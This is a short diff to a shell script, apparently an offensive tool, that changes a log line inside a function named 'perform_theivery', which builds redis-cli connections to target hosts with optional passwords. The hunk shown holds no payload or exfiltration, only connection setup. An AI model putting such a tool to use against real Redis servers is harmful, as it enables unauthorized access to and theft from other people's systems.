@@ -73,8 +73,8 @@ function perform_theivery() {
         if [ "$password" == "$host" ]; then 
             password=""
         fi
-        echo "[+] targeting: ${host}:${port}" >&2;
 
+        debugout "[+] targeting: ${host}:${port}" >&2;
         connect="$REDIS_BIN -h ${host} -p ${port}"
         if [ ${#password} -gt 2 ]; then 
             connect="$REDIS_BIN -h ${host} -p ${port} -a '${password}'"
